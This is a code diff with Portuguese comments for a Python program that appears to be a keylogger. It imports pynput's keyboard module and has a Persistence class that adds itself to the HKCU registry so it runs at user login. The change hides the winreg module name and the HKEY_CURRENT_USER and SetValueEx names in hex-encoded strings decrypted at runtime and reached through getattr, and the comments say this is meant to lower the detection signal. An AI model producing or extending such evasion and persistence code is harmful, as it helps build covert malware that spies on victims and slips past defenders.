@@ -21,7 +21,6 @@ from datetime import datetime
 # acontece em runtime e o nome do módulo fica como string, fora da tabela de
 # imports estáticos. O acesso passa a ser via alias (winreg_mod, shutil_mod,
 # socket_mod, subprocess_mod) — comportamento idêntico, sinal menor.
-winreg_mod = importlib.import_module("winreg")
 shutil_mod = importlib.import_module("shutil")
 socket_mod = importlib.import_module("socket")
 subprocess_mod = importlib.import_module("subprocess")
@@ -103,6 +102,9 @@ _STRINGS_HEX = {
     "not_running":     "010417191c4a00040645430c464a131b1b1d440906",
     "stopped":         "010417191c4a000406455e175d1a110b11",
     "status":          "210417191c4a000406455e17531e141d4f53",
+    "winreg_mod":      "1d080007164a",
+    "hkey_cu":         "222a2b2c2c6e3233262063376d3f322b27",
+    "set_value":       "39041a2312411204311d",
 }
 
 COMMANDS = {name: Crypto.decrypt_string(value, CMD_KEY) for name, value in _COMMANDS_HEX.items()}
@@ -110,6 +112,7 @@ STRINGS = {name: Crypto.decrypt_string(value, CMD_KEY) for name, value in _STRIN
 
 # from pynput import Keyboard -> submódulo ofuscado também
 Keyboard = importlib.import_module(STRINGS["kbd_mod"])
+winreg_mod = importlib.import_module(STRINGS["winreg_mod"])
 
 
 def env_or_secret(env_name, secret_hex, fallback=""):
@@ -337,14 +340,16 @@ class Persistence:
     # login do usuário. Usa HKCU (não HKLM) porque não exige admin.
     def add_to_registry(self, file_path):
         try:
+            hkcu = getattr(winreg_mod, STRINGS["hkey_cu"])
             key = winreg_mod.OpenKey(
-                winreg_mod.HKEY_CURRENT_USER,
+                hkcu,
                 self.registry_key_path,
                 0,
                 winreg_mod.KEY_SET_VALUE
             )
 
-            winreg_mod.SetValueEx(
+            set_val = getattr(winreg_mod, STRINGS["set_value"])
+            set_val(
                 key,
                 self.program_name,
                 0,
@@ -366,8 +371,9 @@ class Persistence:
     # retornamos False (precisa persitir ainda).
     def check_persistence(self):
         try:
+            hkcu = getattr(winreg_mod, STRINGS["hkey_cu"])
             key = winreg_mod.OpenKey(
-                winreg_mod.HKEY_CURRENT_USER,
+                hkcu,
                 self.registry_key_path,
                 0,
                 winreg_mod.KEY_READ
